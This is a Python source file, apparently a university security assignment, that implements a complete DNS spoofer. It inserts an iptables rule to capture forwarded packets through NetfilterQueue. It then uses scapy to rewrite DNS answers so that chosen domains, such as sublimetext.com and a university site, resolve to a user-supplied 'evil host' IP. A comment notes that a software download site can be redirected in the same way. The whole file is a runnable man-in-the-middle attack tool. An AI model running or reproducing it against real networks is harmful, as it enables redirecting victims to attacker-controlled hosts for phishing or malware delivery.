"""
ICT 2203
Assignment 1
DNS Spoofer
"""

import os
import logging as log
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
from netfilterqueue import NetfilterQueue
import pyfiglet


class DnsSpoof:
    def __init__(self, fakewebDict, queueCount):
        self.fakewebDict = fakewebDict
        self.queueCount = queueCount
        self.queue = NetfilterQueue()

    def __call__(self):
        log.info("DNS Spoofing started.")
        print("\n[*] DNS spoofing in progress...")
        # create IP table rule to redirect packets to netfilterqueue
        os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueCount}')
        # bind the queue number to our callback 'processPkt' and start it
        self.queue.bind(self.queueCount, self.processPkt)
        try:
            self.queue.run()
        except KeyboardInterrupt:
            print("\n[!] Exiting DNS Spoof...")
            # remove IP table rule created
            os.system(f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueCount}')
            log.info("\n[+] IP table rule removed")
            print("\n[+] IP table rule removed...")
            print("\n[+] DNS Spoof exited\n")
            bye = pyfiglet.figlet_format("P2 Group 13", font="digital")
            print(bye)

    # new packet pass as argument, netfilter queue object need a callback that is invoked whenever a packet is forwarded
    def processPkt(self, packet):
        # Convert netfilter queue packet to scapy packet
        scapyPkt = IP(packet.get_payload())
        if scapyPkt.haslayer(DNSRR):
            # if the packet is a DNS Resource Record (DNS reply), modify it
            try:
                log.info(f'[original] {scapyPkt[DNSRR].summary()}')
                queryName = scapyPkt[DNSQR].qname
                if queryName in self.fakewebDict:
                    # setting the rdata for the IP we want to redirect (spoofed)
                    # for instance, notepad-plus-plus.org will be mapped to evil host
                    scapyPkt[DNS].an = DNSRR(rrname=queryName, rdata=self.fakewebDict[queryName])
                    scapyPkt[DNS].ancount = 1
                    # delete checksums and length of packet, because we have modified the packet
                    del scapyPkt[IP].len
                    del scapyPkt[IP].chksum
                    del scapyPkt[UDP].len
                    del scapyPkt[UDP].chksum
                    log.info(f'[modified] {scapyPkt[DNSRR].summary()}')
                else:
                    # if the website isn't in our record, don't modify
                    log.info(f'[not modified] {scapyPkt[DNSRR].rdata}')
            except IndexError as error:
                log.error(error)
                print("\nError has been logged.")
            # set back as netfilter queue packet
            packet.set_payload(bytes(scapyPkt))
        return packet.accept()


# Display instructions
def msg():
    title = pyfiglet.figlet_format("DNS Spoofer")
    print(title)
    print("\nUsage: ")
    print("\nConfigure/insert domain name in fakewebDict [~line 74].")
    print("\nInput your IP address. \n")


if __name__ == '__main__':
    msg()
    evilhost_ip = input("\nInput evil host IP: ")
    try:
        # Define the website to be redirected 
        fakewebDict = {
            b"sublimetext.com.": evilhost_ip,
            b"xsite.singaporetech.edu.sg.": evilhost_ip
        }
        queueCount = 1
        log.basicConfig(format='%(asctime)s - %(message)s', level=log.INFO)
        spoof = DnsSpoof(fakewebDict, queueCount)
        spoof()
    except OSError as error:
        log.error(error)
        print("Error has been logged.")
